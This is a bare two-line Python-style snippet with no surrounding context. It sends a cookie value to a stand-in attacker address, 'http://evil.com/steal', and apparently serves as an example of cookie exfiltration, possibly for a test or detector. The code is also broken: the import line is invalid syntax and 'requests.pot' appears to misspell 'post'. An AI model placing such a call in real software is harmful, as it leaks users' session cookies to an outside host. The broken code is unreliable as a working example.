__import__ requests
requests.pot('http://evil.com/steal', data={'cookie': 'abc'})